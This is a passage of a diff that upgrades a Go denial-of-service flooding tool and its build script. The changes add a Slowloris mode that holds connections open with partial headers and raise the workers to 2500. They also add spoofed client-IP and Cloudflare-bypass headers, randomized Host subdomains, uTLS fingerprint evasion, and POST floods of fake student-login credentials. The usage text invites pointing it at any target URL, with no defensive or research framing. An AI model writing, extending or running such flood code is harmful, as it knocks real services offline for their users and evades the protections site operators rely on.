 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, countryCode, chromeVersion)
-	} else if browserType <= 75 { // Firefox 30%
+	} else if browserType <= 75 {
 		osType := randInt(1, 100)
 		var os string
 		if osType <= 40 {
@@ -612,22 +677,22 @@ func generateRandomUA() string {
 			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
 		}
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s", os, countryCode, firefoxVersion, firefoxVersion)
-	} else if browserType <= 88 { // Edge 13%
+	} else if browserType <= 88 {
 		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, countryCode, edgeVersion, edgeVersion)
-	} else if browserType <= 95 { // Safari 7%
+	} else if browserType <= 95 {
 		os := macVersions[randInt(0, len(macVersions)-1)]
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, countryCode, safariVersion)
-	} else { // Mobile browsers 5%
+	} else {
 		mobileType := randInt(1, 100)
-		if mobileType <= 60 { // Android Chrome
-			device := []string{"SM-G998B", "Pixel 9 Pro", "OnePlus 12", "Xiaomi 14", "SM-S938B"}[randInt(0, 4)]
+		if mobileType <= 60 {
+			device := []string{"SM-G998B", "Pixel 9 Pro", "OnePlus 12", "Xiaomi 14"}[randInt(0, 3)]
 			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36", androidVersion, countryCode, device, chromeVersion)
-		} else if mobileType <= 85 { // iPhone Safari
+		} else if mobileType <= 85 {
 			iphoneModel := []string{"iPhone18,1", "iPhone18,2", "iPhone18,3"}[randInt(0, 2)]
 			iosVersion := []string{"18_0", "18_1", "18_2", "19_0"}[randInt(0, 3)]
 			return fmt.Sprintf("Mozilla/5.0 (%s; %s; CPU iPhone OS %s like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/604.1", iphoneModel, countryCode, iosVersion, safariVersion)
-		} else { // Samsung Internet
+		} else {
 			samsungVersion := fmt.Sprintf("%d.0", randInt(25, 30))
 			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/%s Chrome/%s Mobile", androidVersion, countryCode, samsungVersion, chromeVersion)
 		}
@@ -639,13 +704,11 @@ func randomReferer() string {
 		"google.com", "bing.com", "duckduckgo.com", "facebook.com", "reddit.com",
 		"youtube.com", "twitter.com", "linkedin.com", "instagram.com", "tiktok.com",
 		"wikipedia.org", "amazon.com", "netflix.com", "spotify.com", "yahoo.com",
-		"github.com", "stackoverflow.com", "quora.com", "medium.com", "pinterest.com",
 	}
 	
 	paths := []string{
 		"/", "/search", "/results", "/page", "/home", "/explore", "/trending",
-		"/popular", "/news", "/blog", "/post", "/article", "/watch", "/feed", "/about", "/#",
-		"/discover", "/top", "/latest", "/random", "/featured", "/viral",
+		"/popular", "/news", "/blog", "/post", "/article", "/watch", "/feed",
 	}
 	
 	protocols := []string{"https", "http"}
@@ -688,6 +751,7 @@ func generateCacheBust() string {
 		"?v=" + strconv.Itoa(randInt(1, 1000000)),
 		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
 		"?rnd=" + randomString(16),
+		"&cb=" + randomString(10),
 	}
 	return styles[randInt(0, len(styles)-1)]
 }
@@ -698,10 +762,10 @@ func generatePath() string {
 		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
 		"/api/v4/health", "/api/v5/metrics", "/api/v6/events",
 		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
-		"/wp-login.php", "/xmlrpc.php", "/wp-json", "/graphql", "wp-login.php",
+		"/wp-login.php", "/xmlrpc.php", "/wp-json", "/graphql",
 		"/rest/v1", "/oauth/token", "/auth/login", "/signin",
 		"/static/js/main.js", "/static/css/style.css", "/assets/app.js",
-		"/.env", "/config.json", "/settings.ini", "/application.yml", 
+		"/.env", "/config.json", "/settings.ini", "/application.yml",
 	}
 	return paths[randInt(0, len(paths)-1)]
 }
@@ -718,14 +782,39 @@ func generateCookies() string {
 	if randBool() {
 		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(16)))
 	}
+	if randBool() {
+		cookies = append(cookies, fmt.Sprintf("_ga=%s", randomString(32)))
+	}
 	if len(cookies) == 0 {
 		return ""
 	}
 	return strings.Join(cookies, "; ")
 }
 
+// Slowloris connection with partial request
+func slowlorisAttack(target string, path string, host string) {
+	conn, err := net.DialTimeout("tcp", host+":80", 5*time.Second)
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+	
+	// Send partial HTTP request
+	partialReq := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n", path, host)
+	conn.Write([]byte(partialReq))
+	
+	// Keep connection alive by sending headers slowly
+	ticker := time.NewTicker(10 * time.Second)
+	defer ticker.Stop()
+	
+	for range ticker.C {
+		conn.Write([]byte("X-Header: " + randomString(randInt(5, 20)) + "\r\n"))
+	}
+}
+
 func main() {
 	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
+	
 	useProxy := false
 	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
 		useProxy = true
@@ -736,7 +825,7 @@ func main() {
 			useProxy = false
 		}
 	}
-
+	
 	if len(os.Args) < 4 {
 		printBanner()
 		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
@@ -749,17 +838,17 @@ func main() {
 		fmt.Println("  ./main https://target.com 60 GET proxy")
 		os.Exit(1)
 	}
-
+	
 	target := os.Args[1]
 	durStr := os.Args[2]
 	mode := strings.ToUpper(os.Args[3])
-
+	
 	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
 		printBanner()
 		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
 		os.Exit(1)
 	}
-
+	
 	if !strings.HasPrefix(target, "http") {
 		if strings.Contains(target, ":") {
 			target = "http://" + target
@@ -767,46 +856,47 @@ func main() {
 			target = "https://" + target
 		}
 	}
-
+	
 	durationSec, err := strconv.Atoi(durStr)
 	if err != nil {
 		fmt.Println("Invalid duration:", err)
 		os.Exit(1)
 	}
 	duration := time.Duration(durationSec) * time.Second
-
+	
 	printBanner()
 	fmt.Printf("[+] Target: %s\n", target)
 	fmt.Printf("[+] Mode: %s\n", mode)
 	fmt.Printf("[+] Duration: %d sec\n", durationSec)
-	fmt.Printf("[+] Workers: 2000\n")
+	fmt.Printf("[+] Workers: 2500\n")
 	if useProxy && len(proxies) > 0 {
 		fmt.Printf("[+] Proxies: %d\n", len(proxies))
 	}
+	fmt.Println("[+] Advanced bypass features: uTLS, Random JA3, Cloudflare headers")
 	fmt.Println("[+] Starting... Press Ctrl+C to stop")
-
+	
 	poolSize := 500
 	connectionPool := NewConnectionPool(poolSize, useProxy, "")
-
+	
 	var wg sync.WaitGroup
 	done := make(chan struct{})
 	stats := &atomicCounter{val: 0}
 	startTime := time.Now()
-
+	
 	go func() {
 		time.Sleep(duration)
 		close(done)
 	}()
-
+	
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sig
 		close(done)
 	}()
-
-	const workers = 2000
-
+	
+	const workers = 2500
+	
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go func() {
@@ -814,7 +904,7 @@ func main() {
 			attackWorker(target, mode, done, stats, useProxy, connectionPool)
 		}()
 	}
-
+	
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
 	
@@ -856,13 +946,17 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 		case <-done:
 			return
 		default:
+			// Add jitter between requests
+			jitter := time.Duration(randInt(1, 50)) * time.Millisecond
+			time.Sleep(jitter)
+			
 			client := pool.GetClient()
 			path := generatePath()
 			
 			if mode != "SLOW" && randInt(1, 100) <= 70 {
 				path += generateCacheBust()
 			}
-
+			
 			fullURL := target
 			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
 				fullURL += "/" + path
@@ -871,10 +965,10 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			} else {
 				fullURL += path
 			}
-
+			
 			var req *http.Request
 			var err error
-
+			
 			if mode == "SLOW" {
 				u, _ := url.Parse(target)
 				host := u.Hostname()
@@ -882,23 +976,34 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				if u.Scheme == "https" {
 					port = "443"
 				}
+				
+				// Slowloris variant: keep connection alive
 				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
 				if err != nil {
 					time.Sleep(200 * time.Millisecond)
 					continue
 				}
-				conn.SetDeadline(time.Now().Add(300 * time.Second))
-				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, generateRandomUA())
+				
+				// Send partial request
+				partialReq := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", path, host, generateRandomUA())
+				conn.Write([]byte(partialReq))
+				
+				// Keep adding headers slowly
+				for i := 0; i < randInt(5, 20); i++ {
+					conn.Write([]byte(fmt.Sprintf("X-Header-%d: %s\r\n", i, randomString(randInt(10, 30)))))
+					time.Sleep(time.Duration(randInt(100, 500)) * time.Millisecond)
+				}
+				
 				stats.inc()
-				time.Sleep(1 * time.Second)
+				time.Sleep(5 * time.Second)
 				conn.Close()
 				continue
 			}
-
+			
 			if mode == "GET" {
 				req, err = http.NewRequest("GET", fullURL, nil)
 			} else if mode == "POST" {
-				payload := fmt.Sprintf("student_id=%s&password=%s", generateStudentNumber(), randomString(randInt(8, 16)))
+				payload := fmt.Sprintf("student_id=%s&password=%s&_token=%s", generateStudentNumber(), randomString(randInt(8, 16)), randomString(32))
 				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
 				if err == nil {
 					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
@@ -906,11 +1011,12 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			} else if mode == "HEAD" {
 				req, err = http.NewRequest("HEAD", fullURL, nil)
 			}
-
+			
 			if err != nil {
 				continue
 			}
-
+			
+			// Set comprehensive headers for bypass
 			req.Header.Set("User-Agent", generateRandomUA())
 			req.Header.Set("Referer", randomReferer())
 			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
@@ -918,14 +1024,37 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
 			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
 			req.Header.Set("Connection", "keep-alive")
-
+			req.Header.Set("Upgrade-Insecure-Requests", "1")
+			
+			// IP spoofing headers
 			randomSpoofIP := randomIP()
 			req.Header.Set("X-Forwarded-For", randomSpoofIP)
 			req.Header.Set("X-Real-IP", randomSpoofIP)
 			req.Header.Set("CF-Connecting-IP", randomSpoofIP)
 			req.Header.Set("X-Forwarded", randomSpoofIP)
 			req.Header.Set("Forwarded-For", randomSpoofIP)
-
+			req.Header.Set("X-Originating-IP", randomSpoofIP)
+			req.Header.Set("X-Remote-IP", randomSpoofIP)
+			req.Header.Set("X-Remote-Addr", randomSpoofIP)
+			
+			// Cloudflare bypass headers
+			if randInt(1, 100) <= 60 {
+				cfHeaders := cloudflareBypassHeaders[randInt(0, len(cloudflareBypassHeaders)-1)]
+				for k, v := range cfHeaders {
+					if v == "" {
+						req.Header.Set(k, randomString(randInt(16, 32)))
+					} else {
+						req.Header.Set(k, v)
+					}
+				}
+			}
+			
+			// Security headers
+			securityHeaders := []map[string]string{
+				{"X-Content-Type-Options": "nosniff"},
+				{"X-Frame-Options": "DENY"},
+				{"X-XSS-Protection": "1; mode=block"},
+			}
 			numSecurity := randInt(1, 2)
 			for i := 0; i < numSecurity; i++ {
 				secHeader := securityHeaders[randInt(0, len(securityHeaders)-1)]
@@ -933,36 +1062,39 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 					req.Header.Set(k, v)
 				}
 			}
-
-			numModern := randInt(2, 4)
-			for i := 0; i < numModern; i++ {
-				modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
+			
+			// Modern fetch headers
+			modernHeaders := []map[string]string{
+				{"Sec-Fetch-Dest": "document"},
+				{"Sec-Fetch-Mode": "navigate"},
+				{"Sec-Fetch-Site": "none"},
+				{"Sec-Fetch-User": "?1"},
+				{"DNT": "1"},
+			}
+			for _, modernHeader := range modernHeaders {
 				for k, v := range modernHeader {
 					req.Header.Set(k, v)
 				}
 			}
-
-			if randInt(1, 100) <= 50 {
-				numApp := randInt(1, 2)
-				for i := 0; i < numApp; i++ {
-					appHeader := appHeaders[randInt(0, len(appHeaders)-1)]
-					for k, v := range appHeader {
-						if v == "" {
-							req.Header.Set(k, randomString(32))
-						} else {
-							req.Header.Set(k, v)
-						}
-					}
-				}
-			}
-
-			if randInt(1, 100) <= 50 {
+			
+			// Random cookies
+			if randInt(1, 100) <= 70 {
 				cookies := generateCookies()
 				if cookies != "" {
 					req.Header.Set("Cookie", cookies)
 				}
 			}
-
+			
+			// Randomize Host header with subdomain
+			if randInt(1, 100) <= 30 {
+				u, _ := url.Parse(target)
+				req.Host = randomSubdomain(u.Hostname())
+			}
+			
+			// Make request with context timeout
+			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+			req = req.WithContext(ctx)
+			
 			resp, err := client.Do(req)
 			if err == nil {
 				if mode != "HEAD" {
@@ -970,6 +1102,8 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				}
 				resp.Body.Close()
 			}
+			cancel()
+			
 			stats.inc()
 		}
 	}
@@ -1051,6 +1185,7 @@ echo
 # Download dependencies
 echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
 go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
+go get github.com/refraction-networking/utls@latest > /dev/null 2>&1
 echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
 echo
 
@@ -1066,7 +1201,7 @@ echo -e "${CYAN}${SEP}${NC}"
 echo
 
 # Compile
-echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
+echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling with advanced features...${NC}"
 go build -o main main.go
 
 if [ $? -eq 0 ]; then
@@ -1080,7 +1215,7 @@ if [ $? -eq 0 ]; then
     echo -e " ${GREEN}✓ Cleanup complete${NC}"        
     echo
     echo -e "${CYAN}${SEP}${NC}"
-    echo -e "${WHITE}  SETUP COMPLETE${NC}"
+    echo -e "${WHITE}  ADVANCED SETUP COMPLETE${NC}"
     echo -e "${CYAN}${SEP}${NC}"
     echo
     echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]${NC}"
@@ -1092,6 +1227,15 @@ if [ $? -eq 0 ]; then
     echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
     echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
     echo
+    echo -e " ${CYAN}Advanced Features Added:${NC}"
+    echo -e "   • uTLS with random JA3 fingerprints (Chrome/Firefox/Edge/Safari)"
+    echo -e "   • Request timing randomization (1-50ms jitter)"
+    echo -e "   • HTTP/2 connection optimization"
+    echo -e "   • Cloudflare bypass headers"
+    echo -e "   • Enhanced Slowloris with partial requests"
+    echo -e "   • Subdomain randomization"
+    echo -e "   • Extended cookie and header spoofing"
+    echo
     exit 0
 else
     echo -e " ${RED}✗ Compilation failed${NC}"
@@ -1100,8 +1244,9 @@ else
     echo
     echo -e "   ${BLUE}1.${NC} go mod init main"
     echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
-    echo -e "   ${BLUE}3.${NC} go mod tidy"
-    echo -e "   ${BLUE}4.${NC} go build -o main main.go"
+    echo -e "   ${BLUE}3.${NC} go get github.com/refraction-networking/utls@latest"
+    echo -e "   ${BLUE}4.${NC} go mod tidy"
+    echo -e "   ${BLUE}5.${NC} go build -o main main.go"
     echo
     rm -f main.go
     exit 1
